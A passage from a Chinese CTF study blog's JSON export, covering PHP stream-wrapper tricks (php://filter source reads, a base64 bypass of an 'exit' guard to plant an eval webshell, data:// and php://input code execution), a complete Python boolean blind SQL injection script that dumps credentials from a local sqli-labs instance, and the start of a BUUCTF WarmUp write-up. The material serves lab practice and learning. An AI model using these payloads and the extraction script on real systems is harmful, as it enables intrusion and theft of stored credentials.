等遇到了再回来补充学习一下","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]},{"title":"php伪协议","slug":"php伪协议","date":"2023-04-20T16:49:03.000Z","updated":"2024-11-08T10:07:31.165Z","comments":true,"path":"2023/04/21/php伪协议/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"之前对 php 为协议有过初步的学习，但是学习的很拙劣，前几天 buu 刷题用到了 php 伪协议，所以打算重新学习一下","text":"之前对 php 为协议有过初步的学习，但是学习的很拙劣，前几天 buu 刷题用到了 php 伪协议，所以打算重新学习一下 学习链接：https://blog.csdn.net/cosmoslin/article/details/120695429 # php 支持的伪协议 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 # 1、 php://filter 这个伪协议是我认为最常见最常用到的了 # 简介 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile ()、 file () 和 file_get_contents ()， 在数据流内容读取之前没有机会应用其他过滤器。 简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。 php://filter 可以获取指定文件源码。当它与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。 # 协议参数 名称 描述 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分隔。 &lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 最常用的就是 base64 加密读取文件了 1php://filter/read=convert.base64-encode/resource=index.php 利用 filter 协议读文件 ±，将 index.php 通过 base64 编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做 php 文件执行了，而通过编码后则可以读取文件源码。 而使用的 convert.base64-encode，就是一种过滤器。 # 利用 filter 伪协议绕过死亡 exit 什么是死亡 exit 死亡 exit 指的是在进行写入 PHP 文件操作时，执行了以下函数： file_put_contents($content, '&lt;?php exit();' . $content); 亦或者 file_put_contents($content, '&lt;?php exit();?&gt;' . $content); 这样，当你插入一句话木马时，文件的内容是这样子的： 123&lt;?php exit();?&gt;&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt; 这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡 exit 通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。 base64decode 绕过 利用 filter 协议来绕过，看下这样的代码： 1234567&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 当用户通过 POST 方式提交一个数据时，会与死亡 exit 进行拼接，从而避免提交的数据被执行。 然而这里可以利用 php://filter 的 base64-decode 方法，将 $content 解码，利用 php base64_decode 函数特性去除死亡 exit。 base64 编码中只包含 64 个可打印字符，当 PHP 遇到不可解码的字符时，会选择性的跳过，这个时候 base64 就相当于以下的过程： 12345&lt;?php$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);base64_decode($_GET[&#x27;txt&#x27;]); 所以，当 $content 包含 时，解码过程会先去除识别不了的字符，&lt;; ?&gt; 和空格等都将被去除，于是剩下的字符就只有 phpexit 以及我们传入的字符了。由于 base64 是 4 个 byte 一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组 base64 进行解码，也就绕过这个死亡 exit 了。 这个时候后面再加上编码后的一句话木马，就可以 getshell 了。 # 2、data:// 数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。 示例用法： 123451、data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; 2、data://text/plain;base64,http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 范例 Example #1 打印 data:// 的内容 12345&lt;?php// 打印 &quot;I love PHP&quot;echo file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );//SSBsb3ZlIFBIUAo= 解码后 I love PHP?&gt; Example #2 获取媒体类型 1234567&lt;?php$fp = fopen ( &#x27;data://text/plain;base64,&#x27; , &#x27;r&#x27; );$meta = stream_get_meta_data ( $fp );// 打印 &quot;text/plain&quot;echo $meta [ &#x27;mediatype&#x27; ];?&gt; # 3、file:// 用于访问本地文件系统，并且不受 allow_url_fopen，allow_url_include 影响 file:// 协议主要用于访问文件 (绝对路径、相对路径以及网络路径) 比如：http://www.xx.com?file=file:///etc/passsword # 4、php:// 在 allow_url_fopen，allow_url_include 都关闭的情况下可以正常使用 php:// 作用为访问输入输出流 # 5、php://input php://input 可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。 例如： http://127.0.0.1/cmd.php?cmd=php://input POST 数据： 注意： 当 enctype=&quot;multipart/form-data&quot; 的时候 php://input` 是无效的 遇到 file_get_contents () 要想到用 php://input 绕过。 # 6、zip:// zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip:// 流会被当作 php 文件执行。从而实现任意代码执行。 zip:// 中只能传入绝对路径。 要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23（即下述 POC 中 #要用 %23 替换） 只需要是 zip 的压缩包即可，后缀名可以任意更改。 相同的类型的还有 zlib:// 和 bzip2://","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]},{"title":"python编写盲注脚本学习","slug":"python编写盲注脚本学习","date":"2023-04-07T16:09:57.000Z","updated":"2024-11-08T10:08:53.638Z","comments":true,"path":"2023/04/08/python编写盲注脚本学习/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/08/python%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/","excerpt":"学习一下 python 写盲注脚本","text":"学习一下 python 写盲注脚本 # 函数 # requests # Python requests 模块 Python 内置了 requests 模块，该模块主要用来发 送 HTTP 请求 12345678# 导入 requests 包import requests# 发送请求x = requests.get(&#x27;https://www.runoob.com/&#x27;)# 返回网页内容print(x.text) 每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息。 具体学习连接：Python requests 模块 | 菜鸟教程 (runoob.com) # Python 之 requests 的 get 方法 requests.get () 完整形式为 1requests.get(url,params=None,**kwargs) url: 想要获取的网页的链接。 params: url 的额外参数，字典或字节流格式，可选。 **kwargs: 13 个控制访问的参数。 例子： **kwargs 的详细参数如下： 参数 作用 params 字典或字节序列，作为参数增加到 url 中 data 字典、字节序列或文件对象，作为 Request 的内容 json JSON 格式的数据，作为 Request 的内容 headers JSON 格式的数据，作为 Request 的内容 cookies 字典或 CookieJar, Request 中的 cookie auth 字典或 CookieJar, Request 中的 cookie files 字典类型，传输文件 timeout 设定超时时间，秒为单位 proxies 字典类型，设定访问代理服务器，可以增加登录认证 allow_redirects True/False, 默认为 True, 重定向开关 stream True/False, 默认为 True, 获取内容立即下载开关 verify True/False, 默认为 True，认证 SSL 证书开关 cert 本地 SSL 证书路径 # 1. url（请求的 url 地址，必需 ） 形式：字符串 意义：作为请求的 url 地址 使用方法： 123import requestsurl=&quot;http://www.baidu.com&quot;resp=requests.get(url)#向url对应的服务器发送相应的get请求，获得对应的相应 。 # 2. headers 参数（请求头，可选） 形式：字典 意义：作为请求的请求头 使用方法： 12345import requestsurl=r&quot;https://www.baidu.com/s&quot;Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot; &#125;response=requests.get(url=url,headers=Headers) # 3. params 参数 （请求参数，可选） 形式：字典 意义：作为 get 请求的表格信息，会被显式的加到 url 中 使用方法： 1234567import requestsurl=r&quot;https://www.baidu.com/s&quot;#以带参数的Get请求，请求对应页面，比如百度搜索 Python，只需Params=&#123;&quot;wd&quot;:&quot;Python&quot;&#125;Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;&#125;response=requests.get(url=url,params=Params,headers=Headers)print(response.request.url)#输出：https://www.baidu.com/s?wd=Python # 4. proxies 参数 （代理 IP，可选） 形式：字典 意义：作为用户代理，访问服务器会以该代理的 ip 访问服务器，可掩盖本机 ip. 使用方法： 12345678910111213import requests#proxies 是伪ip使用代理访问页面#下面是使用代理访问百度Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Mobile Safari/537.36&quot; &#125;#proxies的格式是字典，类型：协议表示+域名+端口proxies=&#123; &quot;http&quot;:&quot;http://1.192.242.107:9999&quot; # &quot;https&quot;:&quot;https://192.168.0.1:80&quot;&#125;url=&quot;https://www.baidu.com&quot;resp=requests.get(url,headers=Headers,proxies=proxies)print(resp.content.decode()) # 5. verify 参数（ssl 证书验证，可选） 形式：bool 类型 意义：ssl 证书验证是否跳过，用于访问有些页面出现证书验证错误的时候 使用方法： 123456789&#x27;&#x27;&#x27;当访问https页面出现证书错误，可以使用verify来取消验证在get或者post请求的verify参数设置成Falserequests.get(url,headers,data,prams,proxies,verify=False)&#x27;&#x27;&#x27;import requestsurl=&quot;https://www.12306.cn&quot;resp=requests.get(url,verify=False)print(resp.content.decode()) # 6. timeout 参数 （延迟限制，可选） 形式：实数类型 意义：通过添加 timeout 参数，能够保证在指定秒钟内返回响应，否则会报错 使用方法： 1234567891011&#x27;&#x27;&#x27;超时参数的使用response = requests.get(url,timeout=3)通过添加timeout参数，能够保证在3秒钟内返回响应，否则会报错&#x27;&#x27;&#x27;import requestsproxies=&#123;&quot;http&quot;:&quot;http://1.192.242.107:9999&quot;&#125;url=&quot;http://www.baidu.com&quot;try: resp=requests.get(url,proxies=proxies,timeout=3)except : print(&quot;运行时出错&quot;) # 7. cookies 参数 （作为 cookies，可选） 形式：字典 意义：使用该参数会显式将 cookies 字符串加入到请求头的 cookies 中 使用方法： 1#这里不再演示，cookies值本来是键值对，加入到headers中会处理为字符串加入到key对应的值中 学习链接： (1 条消息) Python 之 requests 的 get 方法_python request.get_KetchupZ 的博客 - CSDN 博客 (1 条消息) Python 网络爬虫与信息提取（二）**kwargs 参数详解_kwargs.get_zield 的博客 - CSDN 博客 # Response Response 对象的属性，有以下几种 1234import requestsresponse=requests.get(&quot;http://www.baidu.com/&quot;)print(response) # &lt;Response [200]&gt;print(type(response)) # &lt;class &#x27;requests.models.Response&#x27;&gt; # 1、response.status_code http 请求的返回状态，2XX 表示连接成功，3XX 表示跳转，4XX 客户端错误，500 服务器错误 # 2、response.text http 响应内容的 字符串 (str) 形式，请求 url 对应的页面内容 12response=requests.get(&quot;http://www.baidu.com/&quot;)print(response.text) 打印出的内容含有乱码: 1# &lt;title&gt;ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“&lt;/title&gt; 修改如下，改变下载得到的页面的编码，就可以正常打印出正常的文本了: 12response.encoding=&quot;utf-8&quot;print(response.text) # 打印文本中没有乱码 更改编码要用到 response.encoding=“utf-8” 或者 response.encoding=”gbk” 具体要看你请求的网页是用什么方式编码的，针对不同情况用对应的编码方式。 比如下面这个例子，不用编码也可以打印正常文本，如果你还是用 response.encoding=“utf-8”，以 utf-8 编码，反而会出现乱码 123456789101112# 没有乱码:response =requests.get(&quot;http://www.qq.com/&quot;)print(response.text) response =requests.get(&quot;http://www.qq.com/&quot;)response.encoding=&quot;gbk&quot; print(response.text) # 有乱码:response =requests.get(&quot;http://www.qq.com/&quot;)response.encoding=&quot;utf-8&quot; print(response.text) # 3、response.encoding 从 HTTP header 中猜测的响应内容编码方式 # 4、 response.apparent_encoding 从内容中分析出的响应内容编码方式（备选编码方式） # 5、response.content HTTP 响应内容的二进制形式 123response =requests.get(&quot;http://www.baidu.com/&quot;)# print(response.content) #打印出的是二进制形式print(response.content.decode(&quot;utf-8&quot;)) 123response =requests.get(&quot;http://www.qq.com/&quot;)# print(response.content) #打印出的是二进制形式 print(response.content.decode(&quot;gbk&quot;)) 更改编码使用 response.content.deocde (“utf8”) 更推荐使用 response.content.deocde () 的方式获取响应的 html 页面。 # 6、response.headers http 响应内容的头部内容 学习链接： (1 条消息) python 中的 requests,response.text 与 response.content 及其编码_&lt; 花开花落 &gt; 的博客 - CSDN 博客 # [chr(i) for i in range(33, 127)] # Python chr () 函数 chr () 用一个范围在 range（256）内的（就是 0～255）整数作参数，返回一个对应的字符。 # Python range () 函数用法 函数语法 1range(start, stop[, step]) 参数说明： start: 计数从 start 开始。默认是从 0 开始。例如 range（5）等价于 range（0， 5）; stop: 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是 [0, 1, 2, 3, 4] 没有 5 step：步长，默认为 1。例如：range（0， 5） 等价于 range (0, 5, 1) # 联合使用 123print [chr(i) for i in range(65,91)] #所有大写字母print [chr(i) for i in range(97,123)] #所有小写字母print [chr(i) for i in range(48,58)] #所有数字 # Python find () 方法 # 描述 Python find () 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回 - 1。 # 语法 find () 方法语法： 1str.find(str, beg=0, end=len(string)) str – 指定检索的字符串 beg – 开始索引，默认为 0。 end – 结束索引，默认为字符串的长度 # 实例 12345678#!/usr/bin/python str1 = &quot;this is string example....wow!!!&quot;;str2 = &quot;exam&quot;; print str1.find(str2);print str1.find(str2, 10);print str1.find(str2, 40); 以上实例输出结果如下： 1231515-1 Python find () 方法 | 菜鸟教程 (runoob.com) # Python str () 函数 我们经常需要再消息中使用变量的值。例如，假设我们要祝人生日快乐，可能会编写类似下面的代码： 123age=20message=&quot;Happy &quot; + age + &quot;th Btrthday!&quot;print(message) 但是如果运行这些代码，会引发错误。 在 Python 看来，age 这个变量表示的可能是数值 20，也可能是字符 2 和 0。因为 “+” 运算符两边的数据需要类型一致，因此像上面这样在字符串中使用整数时，需要显式地将这个整数用作字符串，让其与两侧的字符串数据类型保持一致。即调用 str () 函数： 123age=20message=&quot;Happy &quot; + str(age) + &quot;th Birthday!&quot;print(message) 1输出结果：Happy 20th Birthday! # Python List append () 方法 # 描述 append () 方法用于在列表末尾添加新的对象。 # 语法 append () 方法语法： 1list.append(obj) # 参数 obj – 添加到列表末尾的对象。 # 返回值 该方法无返回值，但是会修改原来的列表。 # 实例 以下实例展示了 append () 函数的使用方法： 12345#!/usr/bin/pythonaList = [123, &#x27;xyz&#x27;, &#x27;zara&#x27;, &#x27;abc&#x27;];aList.append( 2009 );print &quot;Updated List : &quot;, aList; 以上实例输出结果如下： 1Updated List : [123, &#x27;xyz&#x27;, &#x27;zara&#x27;, &#x27;abc&#x27;, 2009] Python List append () 方法 | 菜鸟教程 (runoob.com) # 具体代码 我自己写了一小部分的代码，没有用到二分法，后续自己在学习改进 这是 less07 盲注的部分代码，也是自己写的第一个盲注脚本记录一下，还是比较劣质，不够简洁和高效，继续积累慢慢学习 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import requestsurl = &quot;http://192.168.199.177/sqli-labs-php7-master/Less-7/&quot; #有可利用漏洞的urlkeylist = [ chr(i) for i in range(33,127) ] #keylist表示所有字符和大小写字母，ascii码值为33-126的字符和字母flag = &#x27;You are in....&#x27; #用于判断附加sql语句为真的字符，根据网页回显填写def Database_length_name(): #length db_len = 1 while True: db_len_url = url + &quot;?id=1&#x27;)) and length(database())=&quot; + str(db_len) + &quot;--+&quot; response = requests.get(db_len_url) #GET方法发送含payload的request if response.text.find(flag) != -1: print(&quot;The name of current database contains &quot; + str(db_len) + &quot; characters.&quot;) break else: db_len = db_len + 1 #name global db db = str() for i in range(1,db_len+1): for c in keylist: t = ord(c) db_name_url = url + &quot;?id=1&#x27;)) and ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(t) + &quot; --+&quot; r = requests.get(db_name_url) if r.text.find(flag) != -1: db = db + c #print( str(c) ) break print(&quot;The name of current database is &quot; + str(db))def Table(): #table_num for i in range (20): table_num_url = url + &quot;?id=1&#x27;)) and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot; + db + &quot;&#x27;)=&quot; + str(i) + &quot; --+&quot; response = requests.get(table_num_url) if response.text.find(flag) != -1: print(&quot;The current database has &quot; + str(i) + &quot; tables&quot;) table_num = i break #table_length table_len = [] for j in range(0, table_num): for k in range(1, 20): table_length_url = url + &quot;?id=1&#x27;)) and (select length(table_name) from information_schema.tables where table_schema=&#x27;&quot; + db + &quot;&#x27; limit &quot; + str(j) + &quot;,1)=&quot; + str(k) + &quot; --+&quot; r = requests.get(table_length_url) if r.text.find(flag) != -1: print(&quot;The length of the table name in table &quot; + str(j+1) + &quot; is:&quot; + str(k)) table_len.append(k) break #table_name t_name = &#123;&#125; tn = str() for i in range(0, table_num): for j in range(0, table_len[i]): for c in keylist: t = ord(c) k = j + 1 url_table_name = url + &quot;?id=1&#x27;)) and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(k) +&quot;,1))=&#x27;&quot;+ str(t) + &quot;&#x27; --+&quot; re = requests.get(url_table_name) if re.text.find(flag) != -1: tn = tn + c break t_name[i] = str(tn) tn = &quot;&quot; #重置字符串 print(&quot;The table name of &quot; + str(i+1) + &quot; is:&quot; + str(t_name[i]) )Database_length_name()Table() 代码学习的链接 (1 条消息) sqli-labs 布尔盲注脚本的编写_sqli-labs 布尔盲注 写文件_0xdawn 的博客 - CSDN 博客 # 数据库库名长度 数据库库名长度在我学习 web 的时间段里没有见过特别长的名字，十几个字母顶天了，这个不适用二分法也不会很慢 123456789101112def db_length(): db_len = 1 while True: str_db_len = str(db_len) db_len_url = url + &quot;&#x27; and length(database())=&quot; + str_db_len + &quot;--+&quot; r = requests.get(db_len_url) if flag in r.text: print(&quot;\\n当前数据库名长度为：%s&quot; %str_db_len) break else: db_len = db_len + 1 return db_len # 获取当前数据库库名 这个因为要获取 ascii 码值如果用普通的布尔注入回显正不正确来判断的话，没办法区分大小写，就不能获取准确的数据库大小写比如说 sqli-labs 的数据库 security，ascii 值大写字母比小写字母值小，在使用循环递增判断的时候 ascii+1 获取出来的会是 SECURITY 而不是小写字母，虽然数据库名称大部分没啥关系但是在获取 flag 的时候如果不适用 ascii 准确的获取大小写就会出问题，而二分法就能够极大的提高脚本的速度 123456789101112131415161718192021222324252627282930313233def db_name(): low = 32 high = 126 i = 1 km = &quot;&quot; //二分法猜解 while (i&lt;=db_len): str_i = &#x27;%d&#x27; %i if (low + high) % 2 == 0: mid = (low + high) / 2 elif (low + high) % 2 != 0: mid = (low + high + 1) / 2 str_mid = &#x27;%d&#x27; %mid name_url = url + &quot;&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;+str_i+&quot;,1))=&quot;+str_mid+&quot;--+&quot; response = requests.get(name_url) if flag in response.text: km += chr(int(mid)) print(km) i = i + 1 low = 32 high = 126 elif flag not in response.text: name_url = url + &quot;&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;+str_i+&quot;,1))&gt;&quot;+str_mid+&quot;--+&quot; response = requests.get(name_url) if flag in response.text: low = mid elif flag not in response.text: high = mid print(&quot;当前数据库库名为：&quot;+km) return km # 判断表的个数 123456789def table_num(): for i in range(20): str_i = &#x27;%d&#x27; %i num_url = url + &quot;&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot;+db_name+&quot;&#x27;)=&quot;+str_i+&quot;--+&quot; r = requests.get(num_url) if flag in r.text: print(&quot;\\n数据表个数为：%s&quot; %str_i) break return i # 判断表名长度 12345678910111213def table_len(): t_len = [] for i in range(0,table_num): str_i = str(i) for j in range(1,20): str_j = str(j) len_url = url + &quot;&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;&quot;+db_name+&quot;&#x27; limit &quot;+str_i+&quot;,1)=&quot;+str_j+&quot;%23&quot; r = requests.get(len_url) if flag in r.text: print(&quot;第&quot;+str(i+1)+&quot;张表的表名长度为：&quot;+str_j) t_len.append(j) break return t_len # 获取表名 123456789101112131415161718192021222324252627282930313233343536def table_name(): tname = &#123;&#125; for i in range(0,table_num): str_i = str(i) for j in range(table_num): if i == j: k = 1 low = 32 high = 126 bm = &quot;&quot; while (k&lt;=t_len[j]): str_k = str(k) if (low + high) % 2 ==0: mid = (low + high) / 2 elif (low + high) % 2 !=0: mid = (low + high + 1) /2 str_mid = str(mid) name_url = url + &quot;&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))=&quot;+str_mid+&quot;--+&quot; r = requests.get(name_url) if flag in r.text: bm += chr(int(mid)) print(bm) k = k+1 low = 32 high = 126 elif flag not in r.text: name_url = url + &quot;&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))&gt;&quot;+str_mid+&quot;--+&quot; r = requests.get(name_url) if flag in r.text: low = mid elif flag not in r.text: high = mid tname[str(j+1)] = str(bm) for key,value in tname.items(): print(&quot;[+]| &quot;+key+&quot; | &quot;+value) return tname # 获取表中的列名个数 123456789def column_num(): for i in range(10): str_i = str(i) num_url = url + &quot;&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;&quot;+table_name+&quot;&#x27; and table_schema=&#x27;&quot;+db_name+&quot;&#x27;)=&quot;+str_i+&quot;--+&quot; r = requests.get(num_url) if flag in r.text: print(table_name+&quot;表中列的个数为：%s&quot; %str_i) break return i # 列名长度 12345678910111213def column_len(): c_len = [] for i in range(0,column_num): str_i = str(i) for j in range(1,20): str_j = str(j) len_url = url + &quot;&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;&quot;+table_name+&quot;&#x27; and table_schema=&#x27;&quot;+db_name+&quot;&#x27;limit &quot;+str_i+&quot;,1)=&quot;+str_j+&quot;%23&quot; r = requests.get(len_url) if flag in r.text: c_len.append(j) print(&quot;第&quot;+str(i+1)+&quot;列的列名长度为：&quot;+str_j) break return c_len # 猜解列名 12345678910111213141516171819202122232425262728293031323334353637def column_name(): cname = &#123;&#125; for i in range(0, column_num): str_i = str(i) for j in range(column_num): if i == j: k = 1 low = 32 high = 126 cm = &#x27;&#x27; while k &lt;= column_len[j]: str_k = str(k) mid = 0 if (low + high) % 2 == 0: mid = (low + high) / 2 elif (low + high) % 2 != 0: mid = (low + high + 1) / 2 str_mid = str(mid) name_url = url + &quot;&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;+table_name+&quot;&#x27; and table_schema=&#x27;&quot;+db_name+&quot;&#x27; limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))=&quot;+str_mid+&quot;--+&quot; r = requests.get(name_url) if flag in r.text: cm += chr(int(mid)) print(cm) k = k+1 low = 32 high = 126 elif flag not in r.text: name_url = url + &quot;&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;+table_name+&quot;&#x27; and table_schema=&#x27;&quot;+db_name+&quot;&#x27; limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))&gt;&quot;+str_mid+&quot;--+&quot; r = requests.get(name_url) if flag in r.text: low = mid elif flag not in r.text: high = mid cname[str(j)] = str(cm) for key,value in cname.items(): print(&quot;[+]| &quot;+str(int(key)+1)+&quot; | &quot;+value) return cname # 判断字段个数 12345678910def dump_num(): for i in range(0,column_num): for j in range(20): str_j = str(j) num_url = url + &quot;&#x27; and (select count(&quot;+cname[str(i)]+&quot;) from &quot;+db_name+&quot;.&quot;+table_name+&quot;)=&quot;+str_j+&quot;--+&quot; r = requests.get(num_url) if flag in r.text: print(cname[str(i)]+&quot;列中的字段数为：%s&quot; %str_j) break return j # 判断字段长度 12345678910111213141516171819202122def dump_len(): user_len = [] pass_len = [] for i in range(0,dump_num): str_i = str(i) for j in range(1,33): str_j = str(j) len_url = url + &quot;&#x27; and (select length(username) from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1)=&quot;+str_j+&quot;%23&quot; r = requests.get(len_url) if flag in r.text: user_len.append(j) print(&quot;username第&quot;+str(i+1)+&quot;个字段长度为：&quot;+str_j) break for k in range(1,33): str_k = str(k) len_url = url + &quot;&#x27; and (select length(password) from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1)=&quot;+str_k+&quot;%23&quot; r = requests.get(len_url) if flag in r.text: pass_len.append(k) print(&quot;password第&quot;+str(i+1)+&quot;个字段长度为：&quot;+str_k) break return (user_len,pass_len) # 猜解 username、password 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061def dump(): username = &#123;&#125; password = &#123;&#125; for i in range(0,dump_num): str_i = str(i) for j in range(dump_num): if i == j: k = 1 p = 1 low = 32 high = 126 uname = &#x27;&#x27; pword = &#x27;&#x27; while k &lt;= user_len[j]: str_k = str(k) if (low + high) % 2 == 0: mid = (low + high) / 2 elif (low + high) %2 != 0: mid = (low + high + 1) / 2 str_mid = str(mid) user_url = url + &quot;&#x27; and ascii(substr((select username from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))=&quot;+str_mid+&quot;--+&quot; r = requests.get(user_url) if flag in r.text: uname += chr(int(mid)) print(str(i+1)+&quot;| usename：&quot;+uname) k = k+1 low = 32 high = 126 elif flag not in r.text: user_url = url + &quot;&#x27; and ascii(substr((select username from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1),&quot;+str_k+&quot;,1))&gt;&quot;+str_mid+&quot;--+&quot; r = requests.get(user_url) if flag in r.text: low = mid elif flag not in r.text: high = mid username[str(j)] = str(uname) while p &lt;= pass_len[j]: str_p = str(p) if (low + high) % 2 == 0: mid = (low + high) / 2 elif (low + high) %2 != 0: mid = (low + high + 1) / 2 str_mid = str(mid) pass_url = url + &quot;&#x27; and ascii(substr((select password from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1),&quot;+str_p+&quot;,1))=&quot;+str_mid+&quot;--+&quot; r = requests.get(pass_url) if flag in r.text: pword += chr(int(mid)) print(str(i+1)+&quot;| password：&quot;+pword) p = p+1 low = 32 high = 126 elif flag not in r.text: pass_url = url + &quot;&#x27; and ascii(substr((select password from &quot;+db_name+&quot;.&quot;+table_name+&quot; limit &quot;+str_i+&quot;,1),&quot;+str_p+&quot;,1))&gt;&quot;+str_mid+&quot;--+&quot; r = requests.get(pass_url) if flag in r.text: low = mid elif flag not in r.text: high = mid password[str(j)] = str(pword) for x in range(0,13): print(&quot;|&quot;+str(x+1)+&quot;|username:&quot;+username[str(x)]+&quot;|password:&quot;+password[str(x)]+&quot;|&quot;)","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctf刷题","slug":"buuctf刷题","date":"2023-04-06T02:08:34.000Z","updated":"2024-11-08T10:05:00.369Z","comments":true,"path":"2023/04/06/buuctf刷题/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/06/buuctf%E5%88%B7%E9%A2%98/","excerpt":"因为校赛要开始了，所以来刷刷题多见见世面","text":"因为校赛要开始了，所以来刷刷题多见见世面 # [HCTF 2018]WarmUp1 点进连接，一个滑稽 查看网页源代码 提示有一个 source.php 文件，访问 页面显示代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! 